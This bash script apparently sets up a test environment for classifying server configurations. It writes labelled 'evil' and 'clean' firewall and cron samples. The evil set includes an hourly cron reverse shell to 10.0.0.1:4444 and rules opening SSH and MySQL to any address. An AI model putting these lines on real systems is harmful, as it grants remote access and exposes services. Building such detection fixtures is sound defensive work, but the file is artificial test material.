#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip tesseract-ocr imagemagick fonts-dejavu-core
    pip3 install pytest

    mkdir -p /app/corpus/evil /app/corpus/clean /home/user/incoming_backups

    # Create the scanned architectural diagram
    convert -size 600x100 xc:white -font DejaVu-Sans -pointsize 24 -fill black -draw "text 10,50 'MANAGEMENT_CIDR: 198.51.100.0/24'" /app/arch_diagram.png

    # Create the evil corpus files
    echo "ufw allow from 0.0.0.0/0 to any port 22" > /app/corpus/evil/bad_fw_1.conf
    echo "0 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /app/corpus/evil/bad_cron_1.conf
    echo "iptables -A INPUT -p tcp --dport 3306 -s 0.0.0.0/0 -j ACCEPT" > /app/corpus/evil/bad_fw_2.conf
    echo "ufw allow from 203.0.113.0/24 to any port 22" > /app/corpus/evil/bad_fw_3.conf

    # Create the clean corpus files
    echo "ufw allow from 198.51.100.0/24 to any port 22" > /app/corpus/clean/good_fw_1.conf
    echo "0 * * * * /usr/bin/backup.sh" > /app/corpus/clean/good_cron_1.conf
    echo "iptables -A INPUT -p tcp --dport 80 -s 0.0.0.0/0 -j ACCEPT" > /app/corpus/clean/good_fw_2.conf

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
